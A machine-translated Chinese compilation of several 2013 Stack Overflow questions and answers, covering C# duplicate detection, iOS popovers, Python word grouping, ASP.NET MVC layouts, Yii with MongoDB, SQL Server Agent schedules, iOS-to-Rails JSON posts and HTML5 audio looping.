Javascript 和 ruby​​ 的变量在完全不同的“范围”中；这里`<% array_of_items %>`应该定义为模板局部变量：

```
<% array_of_items = [1,2] %>
<%= array_of_items %>
<script>
  document.body.innerHTML += array_of_items;
  array_of_items = ['j', 's'];
  document.body.innerHTML += array_of_items;
  // var from js + var from ruby
  document.body.innerHTML += array_of_items + <% array_of_items %>; // #=> should be smth like `js12`
</script> 
```

# c# - 循环遍历数组以查找重复项花费的时间太长

> ID：15936927
> 
> 赞同：0
> 
> 时间：2013-04-10T21:39:22.230
> 
> 标签：c#, performance, loops

希望你能帮帮我。

我有一个 135.000 行长的 txt 文件，其中包含如下行：`111706469;1972WE;26;Wel`.

程序应该做的是将每一行与它之前的每一行进行比较，以确定它是否超过 80% 相似，然后说明原始行的行号。

像这样我自己设法做的那些事情。

```
 if (rows.Length > 1) {
                for (int rowIndex = 1; rowIndex < rows.Length; rowIndex++) 
                {
                    string cols = rows[rowIndex];
                    bool Dubbel = false;

                    for (int DupIndex = 0; DupIndex < rowIndex; DupIndex++)
                    {
                        string SearchDup = rows[DupIndex];
                        decimal ComparisonResult = Compare(cols, SearchDup);

                        if (ComparisonResult > 80)
                        {
                            cols += ";" + DupIndex;
                            Dubbel = true;
                            break;
                        }  
                    }

                    Console.WriteLine(rowIndex + ";" + cols); 
                }
            } 
```

这意味着程序必须为每个数组项一次又一次地遍历数组。我的问题是，有没有更快/更好的方法来做到这一点？

您能给我的任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-10T21:47:04.833

问题在于您的模糊匹配，它返回一个浮点数 - 如果没有关于模糊函数本身的任何细节，没有办法比 O(N*N) 更好地优化它*（如果我错了 - 请有人纠正我）*

如果您有完全匹配，您可以先删除它们，这样您的 N^2 复杂性将减少到 (NK)^2 - 如果您至少有一些完全匹配，那么这个操作将是值得的。

使用`HashSet<>`，它不需要像第二个对象`Dictionary`

```
List<string> rows = new List<string>(new[] {"AAA","BBB","AAA","CCC"});

HashSet<string> foundLines = new HashSet<string>();

foreach (string row in rows){
if (!foundLines.Contains(row))
    foundLines.Add(row);
}
rows = foundLines.ToList(); 
```

然后继续你的算法

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-10T21:54:19.313

如果不进行重大检修，您将无法获得太多优化。对于完全匹配或搜索与目标非常匹配的任何内容，这将是微不足道的，但对于对象之间的差异，您*必须*将每个项目与之前的每个项目进行比较。

基本上，如果给定一组`N`字符串，则必须与`N`, `N-1`,`N-2`等进行比较。然后您需要*再次*`N-3`将它们与, 除了 进行比较，因为和之间没有关系。*`N+1``N``N+1``N`*

 ** * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-13T00:33:11.887

经过进一步的努力，我找到了自己问题的答案，并认为我应该发布它，以防其他人遇到同样的问题。

我将 txt 文件转换为 mysql 数据库，然后将所有记录选择一次到 DataTable 中。然后代码循环遍历原始数据表中的记录和 SELECT，仅将具有相同邮政编码和门牌号的那些记录循环到第二个数据表中。与原件进行比较。

这将需要 9 小时的过程减少到 2 到 3 分钟。事后很明显，但这是事后诸葛亮……

希望它可以帮助某人。*

# ios - ios ipad UIPopoverController 显示为空且没有错误

> ID：15936931
> 
> 赞同：1
> 
> 时间：2013-04-10T21:39:35.277
> 
> 标签：ios, ipad, uiviewcontroller, uipopovercontroller

我正在尝试实现一个 UIPopoverController 以便能够共享但是当 UIPopoverController 是视图时显示为空并且我没有任何错误。这是我的代码：

```
if ([self.activityPopoverController isPopoverVisible]) {
    [self.activityPopoverController dismissPopoverAnimated:YES];
} else {

    NSString *textToShare=@"I'm sharing this image";
    NSArray *activityItems = [[NSArray alloc]initWithObjects:self.imgToSend,textToShare,nil];
    UIActivityViewController *activityVC=[[UIActivityViewController alloc]initWithActivityItems:activityItems applicationActivities:nil];
     activityVC.excludedActivityTypes=@[UIActivityTypeAssignToContact,UIActivityTypeCopyToPasteboard ];

    activityVC.completionHandler = ^(NSString *activityType, BOOL completed){
        [self.activityPopoverController dismissPopoverAnimated:YES];
    };

    if (self.activityPopoverController) {
        [self.activityPopoverController setContentViewController:activityVC];
    } else {
        self.activityPopoverController = [[UIPopoverController alloc] initWithContentViewController:activityVC];
    }
    [self.activityPopoverController presentPopoverFromRect:[(UIControl *)sender frame]
                                                    inView:self.view
                                  permittedArrowDirections:UIPopoverArrowDirectionAny
                                                  animated:YES];

} 
```

你们中的任何人都可能知道为什么我的代码有问题？

我真的很感谢你的帮助。

更新：

我添加这行代码：

```
 [self.activityPopoverController setPopoverContentSize:self.contentSizeForViewInPopover animated:YES]; 
```

但它看起来都被砍掉了：

![在此处输入图像描述](https://i.stack.imgur.com/NmWwM.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-11T01:22:19.020

这里：

```
 NSArray *activityItems = [[NSArray alloc] 
                              initWithObjects:self.imgToSend,textToShare,nil];
   UIActivityViewController *activityVC=[[UIActivityViewController alloc]
                                          initWithActivityItems:activityItems 
                                          applicationActivities:nil]; 
```

如果`self.imgToSend`是`nil`，`activityItems`将会是`nil`，你会得到一个空的弹出框。因此，您需要检查是否`self.imgToSend`已初始化。尝试`NSLog("imgToSend: %@",self.imgToSend)`检查这种情况。

数组是 nil 因为`nil`是数组终止符，所以如果您的第一个对象是`nil`，系统会认为您的数组在该点完成并且不会超出它（`textToShare`例如到 ）

正如文档所说：

*活动项目*

> 该数组不能为 nil，并且必须至少包含一个对象。

您可以通过交换两个数组项来检查我是否正确：

```
 NSArray *activityItems = [[NSArray alloc] 
                            initWithObjects:textToShare,self.imgToSend,nil]; 
```

*更新*
在您的更新问题中，您介绍了这一行：

```
[self.activityPopoverController setPopoverContentSize:self.contentSizeForViewInPopover     
                                             animated:YES]; 
```

并且您声称这通过使用项目填充活动 PopoverController 来修复活动，但控制器的框架设置错误。

这条线确实改变了 popOver 的框架，但出于所有错误的原因 - 您将框架任意设置为主机 viewController 的 contentSizeForViewInPopover - 这*不是*popOver 中显示的 viewController。您也可以在其中放一些任意数字，例如：

```
[self.activityPopoverController setPopoverContentSize:(CGSize){300,400} 
                                             animated:YES]; 
```

这也将重塑您的弹出框 - 但在这两种情况下，此代码都不负责 activityItems 的存在或不存在。

如果现在出现了 activiyItems，那么您一定也更改了其他内容。我建议您现在尝试在注释掉这一行的情况下运行您的代码：

```
// [self.activityPopoverController setPopoverContentSize:self.contentSizeForViewInPopover     
//                                              animated:YES]; 
```

并报告发生了什么。

我真的很确定你的问题在于`self.imgToSend`。如果我注意替换为本地设置的图像对象，我可以*完全*按照您的问题运行您的代码，并且 activiyItems 显示正确。`self.imgToSend`

这成功了：

```
 UIImage* image= [UIImage imageNamed:@"test.png"];
     NSArray *activityItems = [[NSArray alloc]initWithObjects:image,@"text",nil]; 
```

这失败（空 popOverController）：

```
 UIImage* image= nil;
     NSArray *activityItems = [[NSArray alloc]initWithObjects:image,@"text",nil]; 
```

这成功了：

```
 UIImage* image= nil;
     NSArray *activityItems = [[NSArray alloc]initWithObjects:@"text",image,nil]; 
```

这成功了：

```
 UIImage* image= nil;
     NSArray *activityItems = [[NSArray alloc]initWithObjects:@"text",nil]; 
```

我建议你拿出来`self.imgToSend`看看你的activityItems是否在没有它的情况下正确填充，那么至少你会知道问题出在哪里。

# python - 给定一个单词列表，如何将它们放入“家庭”？

> ID：15936937
> 
> 赞同：3
> 
> 时间：2013-04-10T21:40:02.110
> 
> 标签：python, python-3.x

我正在使用 python 创建一个邪恶的刽子手游戏，但我被卡住了。我正试图弄清楚如何将单词放入家庭中。例如，假设我有一个列表

```
ALLY BETA COOL DEAL ELSE FLEW GOOD HOPE IBEX 
```

根据 E 的位置，每个单词都属于少数几个家族之一：

```
- - - -, containing ALLY, COOL, GOOD
- E - -, containing BETA and DEAL
- - E -, containing FLEW and IBEX
E - - E, containing ELSE
- - - E, containing HOPE. 
```

有没有办法使用字典来帮助确定哪些单词属于哪些家庭？我们班还没有开始谈论字典，但我提前阅读并相信这是可能的。我使用的文件大约 170,000 字，但上面只是一个简单的例子。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-10T21:52:00.047

```
from itertools import groupby

words = ['ALLY', 'BETA', 'COOL', 'DEAL', 'ELSE', 'FLEW', 'GOOD', 'HOPE', 'IBEX']
e_locs = sorted(([c == 'E' for c in w], i) for i, w in enumerate(words))
result = [[words[i] for x, i in g] for k, g in groupby(e_locs, lambda x: x[0])] 
```

结果：

```
>>> result
[['ALLY', 'COOL', 'GOOD'], ['HOPE'], ['FLEW', 'IBEX'], ['BETA', 'DEAL'], ['ELSE']] 
```

这是一个版本，它还跟踪 Es 的位置：

```
words = ['ALLY', 'BETA', 'COOL', 'DEAL', 'ELSE', 'FLEW', 'GOOD', 'HOPE', 'IBEX']
result = {}
for word in words:
    key = ' '.join('E' if c == 'E' else '-' for c in word)
    if key not in result:
        result[key] = []
    result[key].append(word) 
```

结果：

```
>>> pprint.pprint(result)
{'- - - -': ['ALLY', 'COOL', 'GOOD'],
 '- - - E': ['HOPE'],
 '- - E -': ['FLEW', 'IBEX'],
 '- E - -': ['BETA', 'DEAL'],
 'E - - E': ['ELSE']} 
```

选择最大的家庭（使用第一个版本，`result`列表列表在哪里）：

```
>>> max(result, key=len)
['ALLY', 'COOL', 'GOOD'] 
```

要使用第二个版本选择最大的家庭，您可以使用`result.values()`而不是`result`，或者获取包含 E 位置和家庭的元组，您可以使用以下内容：

```
>>> max(result.items(), key=lambda k_v: len(k_v[1]))
('- - - -', ['ALLY', 'COOL', 'GOOD']) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-10T22:10:43.673

```
In [1]: from itertools import groupby

In [2]: import string

In [3]: words = "ALLY BETA COOL DEAL ELSE FLEW GOOD HOPE IBEX".split()

In [4]: table = string.maketrans('ABCDEFGHIJKLMNOPQRSTUVWXYZ',
   ...:                          '????E?????????????????????')

In [5]: f = lambda w: w.translate(table)

In [6]: for k,g in groupby(sorted(words, key=f), f):
   ...:     print k, list(g)
   ...:     
???? ['ALLY', 'COOL', 'GOOD']
???E ['HOPE']
??E? ['FLEW', 'IBEX']
?E?? ['BETA', 'DEAL']
E??E ['ELSE']

# to get the biggest group
In [7]: max((list(g) for _,g in groupby(sorted(words, key=f), f)), key=len)
Out[7]: ['ALLY', 'COOL', 'GOOD'] 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-10T22:06:54.573

使用常规表达式，您可以执行以下操作：

```
import re

def into_families(words):
    # here you could add as many families as you want
    families = {
                '....': re.compile('[^E]{4}'),
                '...E': re.compile('[^E]{3}E'),
                '..E.': re.compile('[^E]{2}E[^E]'),
                '.E..': re.compile('[^E]E[^E]{2}'),
                'E..E': re.compile('E[^E]{2}E'),
    }
    return dict((k, [w for w in words if r.match(w)]) for k, r in families.items()) 
```

或者，如果您想动态创建正则表达式：

```
def into_families(words):
    family_names = set(''.join('E' if x == 'E' else '.' for x in w) for w in words)
    families = dict((x, re.compile(x.replace('.', '[^E]'))) for x in family_names)
    return dict((k, [w for w in words if r.match(w)]) for k, r in families.items()) 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-10T22:19:43.213

```
from collections import defaultdict
import re

words = 'ALLY BETA COOL DEAL ELSE FLEW GOOD HOPE IBEX'.split()

groups = defaultdict(list)

for word in words:
    indices = tuple(m.start() for m in re.finditer('E', word))
    groups[indices].append(word)

for k, v in sorted(groups.items()):
    tpl = ['E' if i in k else'-' for i in range(4)]
    print ' '.join(tpl), ' '.join(v) 
```

# c# - 如何在 MVC 布局或 ViewStart 页面中引用自定义类？

> ID：15936939
> 
> 赞同：3
> 
> 时间：2013-04-10T21:40:10.470
> 
> 标签：c#, asp.net-mvc, asp.net-mvc-4

我正在开发一个 MVC 应用程序，该应用程序将由一些内部（即经过 Windows 身份验证的）员工使用。对我来说不幸的是，我们的 Active Directory 帐户不知道每个员工的 ID——我们的员工数据库根本不与 AD 对话（我知道这会让人畏缩）。

无论如何，网站必须记录每个员工的 ID，因为他或她对各种记录进行更改。过去（在 ASP.NET WebForms 中），我会在 Session 中添加对自定义类的引用，并使用它来检查访问、获取员工 ID 并在顶部显示员工的全名应用。

我将如何在 MVC 中执行此操作？我知道我可以将数据添加到 Session，但我找不到任何方法来干净地引用 _Layout.cshtml 文件中的 Session 数据，老实说，我更愿意将这些数据存储在一个我可以获取 Intellisense 的类中，而不是使用数组索引器。是我太挑剔了吗？

**明确一点：**我试图弄清楚如何在**布局或母版页**中引用存储在自定义类中的信息，或者这只是一个完全愚蠢的想法。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-10T22:02:33.460

正如 Christopher 所说，从企业设计的角度来看，强类型视图是最好的方法。但是，它在您的布局中的事实让您感到困惑。您需要做的是在您的布局中，调用将呈现您想要的内容的控制器操作，并且它返回的视图被强类型化为包含您需要显示的所有数据的视图模型。

假设您想写出一个用户菜单，其中包含一些选项，具体取决于他们的安全访问权限，以及“欢迎 Bob Ross”消息（假设 Bob 已登录）。

所以在你看来你的_Layout你会有一个像......

```
 <div id="header" class="header">
            @{ Html.RenderAction("RenderUserMenu", "Home"); }
        </div> 
```

现在，在 Home 控制器中，您有一个名为 RenderUserMenu 的操作，看起来有点像

```
public ActionResult RenderUserMenu()
        {
            var currentUser = DataManager.GetCurrentUser();
            return PartialView("_UserMenu", currentUser);
        } 
```

这个菜单是一个域用户对象的强类型，所以在那个视图中，你现在可以打印出你想要的关于用户的任何信息，它是 _Layout 的一部分，并显示在从它继承的每个页面上。

这里唯一的巫术是 DataManager.GetCurrentUser() 函数，但我希望你有某种类型的基础设施来获取控制器中任何地方的当前用户。如果不是，它只是一个从会话中提取用户密钥、查询数据库并使用用户数据填充域对象的函数。如果您使用的是 Entity Framework 或 NHibernate 之类的 ORM，那就更容易了。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-10T21:51:44.860

如果您需要在自己的模型/类中传递用户信息，这类似于此问题/答案

[使用 MVC4 将数据放入局部视图或布局](https://stackoverflow.com/a/11544199/1036187)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-10T21:46:35.827

您可能想要使用强类型视图。

[http://www.asp.net/mvc/tutorials/views/dynamic-v-strongly-typed-views](http://www.asp.net/mvc/tutorials/views/dynamic-v-strongly-typed-views)

您可以按照 Phil Haack 的这篇文章中的描述更改基本视图类型。

[http://haacked.com/archive/2011/02/21/changeing-base-type-of-a-razor-view.aspx](http://haacked.com/archive/2011/02/21/changing-base-type-of-a-razor-view.aspx)

# php - 使用 Yii 在 Mongo db 文档中搜索条件

> ID：15936944
> 
> 赞同：0
> 
> 时间：2013-04-10T21:40:25.107
> 
> 标签：php, mongodb, yii, yii-extensions

如何为“一对多”关系创建搜索表单/标准：假设“选择人群 > 10.000 的所有团队”。

我正在使用 MongoRecord 扩展（[http://www.yiiframework.com/extension/mongorecord/](http://www.yiiframework.com/extension/mongorecord/)）作为 MongoDb 的基本活动记录。

我基于来自 mongo db 的集合创建了一个带有 Yii 的 GridView（它适用于我）。我的一个文档的集合具有这样的结构：

```
{
_id":1,
"teamId":2453,
"teamName":"Team A",
"competition":["Competition A","Competition B"],
"matches":
    [
        {
            "_id":147852,
            "crowd":10234,
            "yellowCards":2,
            "scorers" [{....}]
            ....
        }
    ]
...
} 
```

我的文件：

```
$teams = MongoTeam::model()->findAll();    

My dataProvider is:
$dataProvider=new CArrayDataProvider($teams, array(
        'id'=>'_id',
        'sort'=>array(
            'attributes'=>array(
                 '_id', 'teamId', 'teamName', 'matches', ...
            ),
        ),
        'pagination'=>array(
            'pageSize'=>20,
        ),
    ));
    $this->render('index', array('dataProvider'=>$dataProvider)); 
```

在视图中我有这样的东西：

```
$this->widget('zii.widgets.grid.CGridView', array(
    'dataProvider'=>$dataProvider,
    'columns'=>array(
        array(
            'name' => 'Team ID',          
            'type' => 'raw',
            'value' => 'CHtml::encode($data->teamID)'
        ),
        array(
            'name' => 'Team Name',          
            'type' => 'raw',
            'value' => 'CHtml::encode($data->teamName)'
        ),
        ... 
```

但是我无法使用子文档的标准创建过滤器（我的情况：“匹配”）。我不想使用任何其他 mongoDB 扩展/模块等。感谢和抱歉我的英语不好。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-10T22:37:05.090

```
$query=array(
   'matches.crowd'=>array('$gt'=>10000),
   'matches.$'=>1
);
$teams = MongoTeam::model()->findAll($query); 
```

你可以这样使用。但是你不能使用这样的数据提供者。因为它会在 $teams 变量中生成太多行。您必须使用数据提供者的标准。我正在使用[YiiMongoDbSuite](http://www.yiiframework.com/extension/yiimongodbsuite/)执行此操作，它具有 EMongoCriteria 和 EMongoDataProvider 类来完成此操作。

# sql-server - 确定一个 sql server 计划何时会在一个时间跨度内触发？

> ID：15936950
> 
> 赞同：5
> 
> 时间：2013-04-10T21:40:56.467
> 
> 标签：sql-server, scheduling

在我管理的系统中，有几个 SQL Server 代理作业根据 dbo.sysschedules 中定义的计划运行。

我想在我的应用程序上创建一个日历视图，该视图将显示这些作业中的每一个何时计划在给定的时间跨度内运行。例如，如果我的计划设置为在每月的第一个和第四个星期一上午 8:00 运行，那么考虑到当月的时间跨度 (4/2013) 我想获得日期“4/1 /2013 上午 8:00，2013 年 4 月 22 日上午 8:00”返回。

有没有人遇到过实现这一目标的方法？我知道我可以阅读时间表定义并务实地解决这个问题，但我很好奇在我自己进入杂草之前是否有人已经提出了解决方案。

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T02:17:33.023

这些链接看起来会让你走上正确的道路......

[生成 SQL 代理作业计划](http://www.mssqltips.com/sqlservertip/1622/generate-sql-agent-job-schedule-report/)

[访问 SQL Server 代理数据](http://www.mssqltips.com/sqlservertip/1244/accessing-sql-server-agent-data/)

这是我从 mssqltips.com 更改的解决方案。

```
 WITH next_run_time AS
    (       
    SELECT      sJOBSCH.schedule_id AS  [ScheduleID]            
                ,[sJOB].[name] AS [JobName]
                ,CASE 
                WHEN [sJOBH].[run_date] IS NULL OR [sJOBH].[run_time] IS NULL THEN NULL
                ELSE CAST(
                CAST([sJOBH].[run_date] AS CHAR(8))
                + ' ' 
                + STUFF(
                STUFF(RIGHT('000000' + CAST([sJOBH].[run_time] AS VARCHAR(6)),  6)
                    , 3, 0, ':')
                , 6, 0, ':')
                AS DATETIME)
                END AS [LastRunDateTime]
                , CASE [sJOBSCH].[NextRunDate]
                WHEN 0 THEN NULL
                ELSE CAST(
                CAST([sJOBSCH].[NextRunDate] AS CHAR(8))
                + ' ' 
                + STUFF(
                    STUFF(RIGHT('000000' + CAST([sJOBSCH].[NextRunTime] AS VARCHAR(6)),  6)
                    , 3, 0, ':')
                , 6, 0, ':')
                AS DATETIME)
                END AS [NextRunDateTime]
    FROM        [msdb].[dbo].[sysjobs] AS [sJOB]
    LEFT JOIN 
    (
    SELECT      [job_id]
                ,schedule_id
                ,MIN([next_run_date]) AS [NextRunDate]
                ,MIN([next_run_time]) AS [NextRunTime]
    FROM        [msdb].[dbo].[sysjobschedules]
    GROUP BY    [job_id],schedule_id
    )       AS [sJOBSCH]

    ON      [sJOB].[job_id] = [sJOBSCH].[job_id]
    LEFT JOIN 
    (
    SELECT      [job_id]
                ,[run_date]
                ,[run_time]
                ,ROW_NUMBER() OVER (PARTITION BY [job_id] ORDER BY [run_date] DESC, [run_time] DESC

    )           AS RowNumber

    FROM        [msdb].[dbo].[sysjobhistory]
    WHERE       [step_id] = 0
    )       AS  [sJOBH]

        ON      [sJOB].[job_id] = [sJOBH].[job_id]
    AND         [sJOBH].[RowNumber] = 1
    )

    , Occurrence AS
    (
    SELECT      schedule_id AS [ScheduleID]
                ,[schedule_uid] AS [ScheduleUID]
                ,[name] AS [ScheduleName]
                ,CASE [enabled]
                WHEN 1 THEN 'Yes'
                WHEN 0 THEN 'No'
                END AS [IsEnabled]
                ,CASE 
                WHEN [freq_type] = 64 THEN 'Start automatically when SQL Server Agent starts'
                WHEN [freq_type] = 128 THEN 'Start whenever the CPUs become idle'
                WHEN [freq_type] IN (4,8,16,32) THEN 'Recurring'
                WHEN [freq_type] = 1 THEN 'One Time'
                END [ScheduleType]
                ,CASE [freq_type]
                WHEN 1 THEN 'One Time'
                WHEN 4 THEN 'Daily'
                WHEN 8 THEN 'Weekly'
                WHEN 16 THEN 'Monthly'
                WHEN 32 THEN 'Monthly - Relative to Frequency Interval'
                WHEN 64 THEN 'Start automatically when SQL Server Agent starts'
                WHEN 128 THEN 'Start whenever the CPUs become idle'
                END [Occurrence]
                ,CASE [freq_type]
                WHEN 4 THEN 'Occurs every ' + CAST([freq_interval] AS VARCHAR(3)) + ' day(s)'
                WHEN 8 THEN 'Occurs every ' + CAST([freq_recurrence_factor] AS VARCHAR(3)) 
                        + ' week(s) on '
                        + CASE WHEN [freq_interval] & 1 = 1 THEN 'Sunday' ELSE '' END
                        + CASE WHEN [freq_interval] & 2 = 2 THEN ', Monday' ELSE '' END
                        + CASE WHEN [freq_interval] & 4 = 4 THEN ', Tuesday' ELSE '' END
                        + CASE WHEN [freq_interval] & 8 = 8 THEN ', Wednesday' ELSE '' END
                        + CASE WHEN [freq_interval] & 16 = 16 THEN ', Thursday' ELSE '' END
                        + CASE WHEN [freq_interval] & 32 = 32 THEN ', Friday' ELSE '' END
                        + CASE WHEN [freq_interval] & 64 = 64 THEN ', Saturday' ELSE '' END
                WHEN 16 THEN 'Occurs on Day ' + CAST([freq_interval] AS VARCHAR(3)) 
                             + ' of every '
                             + CAST([freq_recurrence_factor] AS VARCHAR(3)) + ' month(s)'
                WHEN 32 THEN 'Occurs on '
                         + CASE [freq_relative_interval]
                            WHEN 1 THEN 'First'
                            WHEN 2 THEN 'Second'
                            WHEN 4 THEN 'Third'
                            WHEN 8 THEN 'Fourth'
                            WHEN 16 THEN 'Last'
                           END
                         + ' ' 
                         + CASE [freq_interval]
                            WHEN 1 THEN 'Sunday'
                            WHEN 2 THEN 'Monday'
                            WHEN 3 THEN 'Tuesday'
                            WHEN 4 THEN 'Wednesday'
                            WHEN 5 THEN 'Thursday'
                            WHEN 6 THEN 'Friday'
                            WHEN 7 THEN 'Saturday'
                            WHEN 8 THEN 'Day'
                            WHEN 9 THEN 'Weekday'
                            WHEN 10 THEN 'Weekend day'
                           END
                         + ' of every ' + CAST([freq_recurrence_factor] AS VARCHAR(3)) 
                         + ' month(s)'
                END AS [Recurrence]
                ,CASE [freq_subday_type]
                WHEN 1 THEN 'Occurs once at ' 
                        + STUFF(
                     STUFF(RIGHT('000000' + CAST([active_start_time] AS VARCHAR(6)), 6)
                                    , 3, 0, ':')
                                , 6, 0, ':')
                WHEN 2 THEN 'Occurs every ' 
                        + CAST([freq_subday_interval] AS VARCHAR(3)) + ' Second(s) between ' 
                        + STUFF(
                       STUFF(RIGHT('000000' + CAST([active_start_time] AS VARCHAR(6)), 6)
                                    , 3, 0, ':')
                                , 6, 0, ':')
                        + ' & ' 
                        + STUFF(
                        STUFF(RIGHT('000000' + CAST([active_end_time] AS VARCHAR(6)), 6)
                                    , 3, 0, ':')
                                , 6, 0, ':')
                WHEN 4 THEN 'Occurs every ' 
                        + CAST([freq_subday_interval] AS VARCHAR(3)) + ' Minute(s) between ' 
                        + STUFF(
                       STUFF(RIGHT('000000' + CAST([active_start_time] AS VARCHAR(6)), 6)
                                    , 3, 0, ':')
                                , 6, 0, ':')
                        + ' & ' 
                        + STUFF(
                        STUFF(RIGHT('000000' + CAST([active_end_time] AS VARCHAR(6)), 6)
                                    , 3, 0, ':')
                                , 6, 0, ':')
                WHEN 8 THEN 'Occurs every ' 
                        + CAST([freq_subday_interval] AS VARCHAR(3)) + ' Hour(s) between ' 
                        + STUFF(
                        STUFF(RIGHT('000000' + CAST([active_start_time] AS VARCHAR(6)), 6)
                                    , 3, 0, ':')
                                , 6, 0, ':')
                        + ' & ' 
                        + STUFF(
                        STUFF(RIGHT('000000' + CAST([active_end_time] AS VARCHAR(6)), 6)
                                    , 3, 0, ':')
                                , 6, 0, ':')
                END [Frequency]
                ,STUFF(
                    STUFF(CAST([active_start_date] AS VARCHAR(8)), 5, 0, '-')
                        , 8, 0, '-') AS [ScheduleUsageStartDate]
                ,STUFF(
                STUFF(CAST([active_end_date] AS VARCHAR(8)), 5, 0, '-')
                    , 8, 0, '-') AS [ScheduleUsageEndDate]
                ,[date_created] AS [ScheduleCreatedOn]
                ,[date_modified] AS [ScheduleLastModifiedOn]
    FROM        [msdb].[dbo].[sysschedules]

    )

    Select      nrt.JobName,nrt.LastRunDateTime,nrt.NextRunDateTime
                ,o.Occurrence,o.Recurrence
    From        next_run_time AS nrt
    Inner Join  Occurrence o
        ON      nrt.ScheduleID = o.ScheduleID 
```

这个查询的结果对我来说。

JobName===========syspolicy_purge_history

LastRunDateTime====4/23/13 19:47

NextRunDateTime====4/24/13 2:00

发生=========每天

重复=========每 1 天发生一次

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-18T04:28:55.337

我会看看这个工具并运行 Profiler 来查看它执行的查询。它是一个方便的工具。

[http://sqlsoft.co.uk/sqljobvis.php](http://sqlsoft.co.uk/sqljobvis.php)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-18T15:58:22.000

在 MSDB 数据库中查看以下内容：

```
select sj.name, sch.next_run_date, sch.next_run_time 
from sysjobschedules sch
inner join sysjobs sj
    on sj.job_id = sch.job_id 
```

# objective-c - 使用 NSMutableRequest 通过 POST 发送 JSON 数据可以在本地工作，但不能在生产环境中工作

> ID：15936956
> 
> 赞同：1
> 
> 时间：2013-04-10T21:41:15.877
> 
> 标签：objective-c, json, ruby-on-rails-3

我有一个将 JSON 数据发送到 Ruby on Rails API 的 IOS 应用程序。在 Rails 方面，如果我在本地进行测试，我会看到参数通过就好了。当我在 Heroku 上调用生产服务器的 IOS 应用程序时，参数是 nil 对象。

这是IOS代码

```
NSDictionary *noteVo = [NSDictionary dictionaryWithObjectsAndKeys:note->title, @"title", note->body, @"body", note->note_id, @"note_id", nil];

    NSDictionary *dictionary = [NSDictionary dictionaryWithObjectsAndKeys:[_dm getUser]->uuid, @"uuid", noteVo, @"note", nil];

    NSError *writeError = nil;

    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:dictionary options:NSJSONWritingPrettyPrinted error:&writeError];

    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:
                                    [NSURL URLWithString:[BASE_URL stringByAppendingString:@"note/update"]] cachePolicy:NSURLRequestUseProtocolCachePolicy timeoutInterval:60.0];
    [request setHTTPMethod:@"POST"];
    [request setValue:@"application/json" forHTTPHeaderField:@"Accept"];
    [request setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
    [request setValue:[NSString stringWithFormat:@"%d", [jsonData length]] forHTTPHeaderField:@"Content-Length"];
    [request setHTTPBody: jsonData];

    [[NSURLConnection alloc] initWithRequest:request delegate:self]; 
```

这是导轨代码

```
def update_note

    puts "debug note update #{ params[:note] }"

    uuid = params[:uuid]
    user = User.find_by_uuid(uuid)
    noteid = params[:note][:note_id] if params[:note][:note_id]

    if !user.nil?
      note = nil
        note = user.notes.find(noteid) if !noteid.nil?
        if !note.nil?
            user.notes.find(noteid) 
            note.update_attributes!(params[:note])
        else
            note = user.notes.build(params[:note])
        note.save
        end
        render :json => {:result => note}
    else
        render :json => {:error => "nope"}
    end
  end 
```

# html - 在 HTML5 中循环

> ID：15936958
> 
> 赞同：1
> 
> 时间：2013-04-10T21:41:18.937
> 
> 标签：html, html5-audio

我对这整个 html 东西很陌生。我制作了这段代码，它允许我设置 2 张图片，例如开始和停止。单击“开始”时，它还应播放循环音频文件，单击“停止”时该文件应停止。

虽然单击“停止”时音频停止，但播放时音频不会循环播放！

非常感谢您的帮助...o

这是在头脑中：

```
<script type="text/javascript">

function imageSwitch(_imgID,_imgStart,_imgStop,_soundFile) {
this.imgID = _imgID;
this.imgStart = _imgStart;
this.imgStop = _imgStop;
this.soundFile = _soundFile;

this.pos = 0;
this.e;

this.change = function() {
if(this.pos == 0) {
this.pos = 1;
document.getElementById(this.imgID).src = this.imgStop;

this.e = document.createElement('embed');
this.e.setAttribute('src','https://dl.dropbox.com/u/39640025/MP3/Waves.mp3');
this.e.setAttribute('id','sound'+this.imgID);
this.e.setAttribute('hidden','true');
this.e.setAttribute('autostart','true');
this.e.setAttribute('loop','true');

document.body.appendChild(this.e);
} else {
this.pos = 0;
document.getElementById(this.imgID).src = this.imgStart;
this.e.parentNode.removeChild(this.e);
}
}
} 
```

这也在头脑中：

```
var wave = new imageSwitch('btn1','https://dl.dropbox.com/u/39640025/OMAA/Waves2PNG.png','https://dl.dropbox.com/u/39640025/OMAA/Active/Waves%20Active%20PNG.png','https://dl.dropbox.com/u/39640025/MP3/Waves.mp3'); 
```

这是在体内：

```
<div style="position: absolute; left: 10px; top: 60px;"><img src="https://dl.dropbox.com/u/39640025/OMAA/Waves2PNG.png"
                             width="331" height="96" border="0" alt="one" onClick="wave.change()" id="btn1" /></div> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-10T21:48:42.730

您应该使用[音频元素](http://www.w3.org/wiki/HTML/Elements/audio)而不是嵌入。

查看它的 api - 有一个用于循环的“循环”属性。

为了确定显示哪个图像，您必须监听音频元素的*play*、*pause*等事件。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-10T21:57:18.987

你的代码没问题，我宁愿使用[Audio api](http://www.w3schools.com/tags/ref_av_dom.asp)

您的代码中的问题，您无法在 onclick 事件中访问 wave 对象。让它全球化你会看到它的工作原理。

```
